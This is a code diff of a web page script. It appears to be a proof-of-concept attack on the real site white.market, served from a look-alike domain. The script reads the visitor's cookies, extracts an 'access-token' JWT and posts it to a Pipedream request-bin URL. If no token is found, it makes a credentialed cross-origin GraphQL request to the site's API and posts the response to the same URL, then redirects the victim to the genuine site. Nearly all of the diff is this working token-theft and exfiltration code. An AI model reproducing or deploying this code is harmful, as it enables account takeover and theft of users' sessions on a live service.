@@ -8,34 +8,40 @@
 const status = document.getElementById('status');
 const REQUESTBIN = 'https://eo5dlnbgif530n8.m.pipedream.net';
 
-// Check cookies
+// Check what cookies are available on apixwhite.market
 const localCookies = document.cookie;
-status.innerHTML = 'Checking cookies...<br>';
+console.log('=== COOKIES ON APIXWHITE.MARKET ===');
+console.log(localCookies);
 
+status.innerHTML = 'Cookies on apixwhite.market:<br>' + (localCookies || 'NONE') + '<br><br>';
+
+// Check specifically for access-token
 if (localCookies.includes('access-token')) {
-    const jwt = localCookies.split(';').find(c => c.includes('access-token')).split('=')[1];
-    status.innerHTML += 'JWT FOUND (direct theft)!<br>';
-    fetch(REQUESTBIN + '?method=direct_cookie&jwt=' + encodeURIComponent(jwt.substring(0, 200)));
+    const jwt = localCookies.split(';').find(c => c.trim().startsWith('access-token=')).split('=')[1];
+    
+    console.log('=== SUCCESS - JWT STOLEN VIA COOKIE LEAKAGE ===');
+    console.log(jwt);
+    
+    status.innerHTML += '<strong>CRITICAL: JWT STOLEN FROM COOKIE!</strong><br>';
+    status.innerHTML += 'JWT: ' + jwt.substring(0, 100) + '...<br><br>';
+    
+    // Exfiltrate
+    fetch(REQUESTBIN, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            attack_method: 'DIRECT_COOKIE_THEFT',
+            jwt: jwt,
+            timestamp: new Date().toISOString(),
+            success: true
+        })
+    });
 } else {
-    status.innerHTML += 'No JWT in cookies<br>';
-    fetch(REQUESTBIN + '?method=direct_cookie&result=no_cookie_leaked');
-}
-
-// Try multiple CORS queries
-const queries = [
-    {
-        name: 'basic_query',
-        query: 'query{__typename}',
-        operationName: 'BasicQuery'
-    },
-    {
-        name: 'auth_token_mutation',
-        query: 'mutation AuthToken { auth_token { accessToken } }',
-        operationName: 'AuthToken'
-    }
-];
-
-queries.forEach(q => {
+    console.log('=== Cookie did not leak - trying CORS attack ===');
+    status.innerHTML += 'Cookie did not leak to apixwhite.market<br>';
+    status.innerHTML += 'Trying CORS attack instead...<br><br>';
+    
+    // CORS attack - make authenticated request and steal data
     fetch('https://api.white.market/graphql/api', {
         method: 'POST',
         credentials: 'include',
@@ -44,24 +50,53 @@ queries.forEach(q => {
             'x-accept-language': 'en_US'
         },
         body: JSON.stringify({
-            query: q.query,
-            operationName: q.operationName
+            query: 'query{__typename}',
+            operationName: 'Test'
         })
     })
-    .then(r => r.json())
+    .then(r => {
+        console.log('CORS response status:', r.status);
+        return r.json();
+    })
     .then(d => {
-        console.log(q.name + ':', d);
-        status.innerHTML += q.name + ': ' + JSON.stringify(d).substring(0, 100) + '...<br>';
+        console.log('=== CORS ATTACK SUCCESS ===');
+        console.log(d);
         
-        fetch(REQUESTBIN + '?method=' + q.name + '&data=' + encodeURIComponent(JSON.stringify(d)));
+        status.innerHTML += 'CORS attack worked!<br>';
+        status.innerHTML += 'Response: ' + JSON.stringify(d) + '<br>';
+        
+        fetch(REQUESTBIN, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                attack_method: 'CORS_EXPLOITATION',
+                response: d,
+                timestamp: new Date().toISOString(),
+                success: true,
+                note: 'Can make authenticated requests and read responses'
+            })
+        });
     })
     .catch(e => {
-        console.error(q.name + ' error:', e);
-        status.innerHTML += q.name + ' ERROR<br>';
+        console.error('=== CORS FAILED ===');
+        console.error(e);
+        
+        status.innerHTML += 'CORS attack failed: ' + e.message + '<br>';
+        
+        fetch(REQUESTBIN, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                attack_method: 'FAILED',
+                error: e.message,
+                timestamp: new Date().toISOString()
+            })
+        });
     });
-});
+}
 
-setTimeout(() => window.location.href = 'https://white.market', 8000);
+status.innerHTML += '<br>Redirecting in 10 seconds...';
+setTimeout(() => window.location.href = 'https://white.market', 10000);
 </script>
 </body>
 </html>
